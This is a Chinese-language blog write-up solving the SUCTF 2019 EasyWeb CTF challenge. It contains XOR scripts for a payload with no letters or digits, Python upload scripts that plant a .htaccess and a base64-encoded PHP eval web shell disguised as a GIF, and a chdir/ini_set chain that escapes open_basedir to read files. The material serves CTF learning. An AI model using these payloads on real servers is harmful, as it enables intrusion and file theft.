<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="buuctf18"><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>buuctf18 | Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasyWeb"><span class="toc-number">2.</span> <span class="toc-text">[SUCTF 2019]EasyWeb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text">文件上传思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%9E%84%E9%80%A0"><span class="toc-number">2.1.1.</span> <span class="toc-text">.htaccess文件内容构造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">小结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">111</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">buuctf18</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-06-08</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉最近有点小浮躁，必须要尽快调整~脚踏实地才是最重要的</p>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);<span class="comment">//不可以使用超过12种的字符</span></span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>思路:执行eval函数，然后上传文件<br>首先需要绕过那个正则匹配字母数字的，之前使用异或去取字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str = <span class="string">r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;\/&quot;</span></span><br><span class="line"><span class="comment"># if re.match(&#x27;[a-zA-Z0-9]+&#x27;,&#x27;a&#x27;):</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">print(chr(ord(<span class="string">&#x27;!&#x27;</span>)^ord(<span class="string">&#x27;@&#x27;</span>)))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(str)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str)):</span><br><span class="line">        result=chr(ord(str[j])^ord(str[i]))</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&#x27;[a-zA-Z0-9]+&#x27;</span>,result):</span><br><span class="line">           <span class="keyword">print</span> str[j]+<span class="string">&quot;^&quot;</span>+str[i]+<span class="string">&quot;=&quot;</span>+result</span><br><span class="line">           print(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>但是发现也有过滤一些特殊字符，所以这个方法不太行，</p>
<p><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4306654/blog/3363280">https://my.oschina.net/u/4306654/blog/3363280</a><br>用一下其他办法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">find = [<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;_&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result=chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a= i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)<span class="comment">#将十进制整数，转化为bytes(十六进制)</span></span><br><span class="line">            b= j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            a= urllib.parse.quote(a)<span class="comment">#进行URL编码</span></span><br><span class="line">            b= urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">&quot;%s:%s^%s&quot;</span>%(result,a,b))</span><br></pre></td></tr></table></figure>

<p>我们将范围扩大到很多不可见字符，这里就是使用ascii码了，然后为了防止被过滤，我就找了最下面的几个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t:%FE^%AA</span><br><span class="line">_:%FE^%A1</span><br><span class="line">G:%FE^%B9</span><br><span class="line">E:%FE^%BB</span><br></pre></td></tr></table></figure>

<p>绕过18个字符就是用get再传参一次</p>
<p><strong>first_payload for test:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;%A1%B9%BB%AA^%FE%FE%FE%FE&#125;&#123;%A1&#125;();&amp;%A1&#x3D;phpinfo</span><br><span class="line">$&#123;_GET&#125;&#123;%A1&#125;()&#x3D;$_GET(%A1)</span><br></pre></td></tr></table></figure>

<p>这里有个很奇怪的点，就是这个t，别人跑出来都是AA我跑出来是8A=-=，所以payload一直不对，但是放到python里面去解析，去反编码回去，又是正确的?难道又是版本问题吗？</p>
<p>总<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210610144501.png" alt="img" style="zoom:67%;"></p>
<p>总之，到这里就可以继续往下走了，接下来看源码，发现需要上传文件了<br>看一下过滤吧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">  <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">  mkdir($userdir);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">      $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">      $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">      <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">      $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">      @move_uploaded_file($tmp_name, $path);</span><br><span class="line">      print_r($path);</span><br></pre></td></tr></table></figure>

<p>1.检查后缀是否含有ph、检查内容是否含有&lt;?、检查是否为图片<br><img src="https://img2018.cnblogs.com/blog/1063309/201907/1063309-20190718171528562-530311975.png" alt="img" style="zoom:67%;"></p>
<h3 id="文件上传思路"><a href="#文件上传思路" class="headerlink" title="文件上传思路"></a>文件上传思路</h3><p>由于过滤了ph后缀的文件，所以我们只能上传user.ini或者htaccess，这里显然上传htaccess更合适，因为可以用来将其他非php的文件解析为php，但是接下来会检查内容是否含有&lt;? 这里就是一个难点了，因为此时短标签绕过不了，想着使用&lt;script&gt;进行绕过，但是刚刚我们可以看到这个php版本为7.几的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210610153840.png" alt="img" style="zoom:67%;"></p>
<p>这里有两种方法，一种是改变php的编码格式，另一种是以加密的形式传入，并解密读取<br>接下来是绕过图片检查，这里使用的函数是exit_imagetype()<br>**exif_imagetype()**读取图像的第一个字节并检查其签名。此时就很妨碍我们上传.htaccess了，这样就会不符合.htaccess的书写语法，导致无法解析.htaccess，那么我们该如何操作呢？这里说一下看完WP后的理解：要满足该函数的检查，首先会检查第一个字节，可以发现，第一个字节为空可以绕过检查，即/x00但是因为是图片检查，又需要定义其大小才会符合图片的定义（这里由于不了解exif_imagetype()的C代码运行逻辑，所以只能先猜测一下，待后面找到了再来补充，问了一下学长，确实是这样），接下来就是书写.htaccess的内容了，然后上传完.htaccess就上传我们的马，此时也需要加密一波再进行上传，头的检查和刚才的一样。</p>
<h4 id="htaccess文件内容构造"><a href="#htaccess文件内容构造" class="headerlink" title=".htaccess文件内容构造"></a>.htaccess文件内容构造</h4><p>首先解决第一个问题:没有上传窗口如何上传文件——使用Python的requests库上传文件<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/five3/article/details/74913742">https://blog.csdn.net/five3/article/details/74913742</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">conten_htacc=<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1</span></span><br><span class="line"><span class="string">#define height 1</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .gg</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=tt.gg#这里就将其进行base64进行编码</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://135d9802-5db9-41f2-8761-9eeb38a3ece9.node3.buuoj.cn?_=$&#123;%A1%B9%BB%AA^%FE%FE%FE%FE&#125;&#123;%A1&#125;();&amp;%A1=get_the_flag&quot;</span></span><br><span class="line"></span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,conten_htacc,<span class="string">&#x27;image/png&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r=s.post(url,files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>根据这个获取文件夹所在位置<br>upload/tmp_4f105b2c0ec2da14aae9b130ee13f8e9/.htaccess<br>接下来是构造我们的图片马</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://a199f759-9689-41ad-b7a7-c0bab6144be6.node3.buuoj.cn/?_=$&#123;%A1%B9%BB%AA^%FE%FE%FE%FE&#125;&#123;%A1&#125;();&amp;%A1=get_the_flag&quot;</span></span><br><span class="line">content_hta=<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1</span></span><br><span class="line"><span class="string">#define height 1</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .test</span></span><br><span class="line"><span class="string">php_value auto_append_file  &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_233e0752380798f15678fca34b470aea/1.test</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">file1=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,content_hta,<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r=s.post(url,files=file1).text</span><br><span class="line">print(r)</span><br><span class="line">txt_content=<span class="string">b&quot;GIF89a&quot;</span>+<span class="string">b&quot;aa&quot;</span>+base64.b64encode(<span class="string">b&quot;&lt;?php @eval($_GET[cmd])?&gt;&quot;</span>)</span><br><span class="line">file2=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.test&#x27;</span>,txt_content,<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r=s.post(url,files=file2).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>

<p>这边有个小细节 因为我们需要让php中的内容进行base64解码，但是前面又有个GIF98a不是base64编码内容，为了不让编码紊乱，base64的编码是将每三个字符转化为四个字符，那么解码的时候就会将原本的四个字符转化为三个字符，所以此时要多加两个字符，才不会影响到后面的马<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210611093317.png" alt="img" style="zoom:67%;"></p>
<p>没办法用蚁剑直接连接，推测是因为路径限制<br>接下来我们要做的就是绕过open_basedir，进行文件的读取</p>
<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a></p>
<p><a target="_blank" rel="noopener" href="https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/">https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/</a></p>
<p>这篇文章有关于open_basedir绕过的底层详解<br>看完以后我的理解是这样，ini_set open_basedir只是关注绝对路径和相对路径的拼接，其实是没有关注相对路径是会发生变化的</p>
<p>这里举个例子说明:<br>假设我们的open_basedir为/var/www/html/ 我们位于/var/www/html/test 目录下，执行第一个ini_set后，首先判断/var/www/html/test/..即/var/www/html/是否为open_basedir内，判断成功，<strong>因此直接更新open_basedir为..</strong><br><strong>chdir() 函数改变当前的目录。</strong>那么接下来我们执行chdir(‘..’) ..根据当前目录补全后为/var/www/html 而open_basedir补全以后也是var/www/html 同样满足，所以我们就可以这样一直跳转到根目录下</p>
<p>POC链：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210611105042.png" alt="img" style="zoom:67%;">
可以看到flag文件了

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(file_get_contents(&#39;&#x2F;THis_Is_tHe_F14g&#39;));</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>感觉这道题真的收获很多，这边理一下：<br>首先是思路:无字母数字如何getshell？——&gt;如何绕过文件上传限制——&gt;如何绕过open_basedir读取文件</p>
<p>收获知识点：<br>1.无字母数字获取脚本编写<br>2.PHP7特性下，变量解析的更新<br>3.htaccess+文件包含绕过内容过滤以及exif_imagetype的bypass<br>4.open_basedir+ini_set+chdir绕过open_basedir<br>没有实践的点记录一下：<br>exif_imagetype()以及open_basedir()+ini_set()函数的底层代码跳转过程</p>
<p>参考：<a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/">https://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11488051.html">https://www.cnblogs.com/20175211lyz/p/11488051.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6f05923012d7">https://www.jianshu.com/p/6f05923012d7</a></p>
<p><a target="_blank" rel="noopener" href="https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/">https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/</a></p>
<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">vague huang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/06/08/buuctf18/">http://example.com/2021/06/08/buuctf18/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/06/08/%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"><i class="fa fa-chevron-left">  </i><span>不包含数字和字母的webshell</span></a></div><div class="next-post pull-right"><a href="/2021/06/05/buuctf17/"><span>buuctf17</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>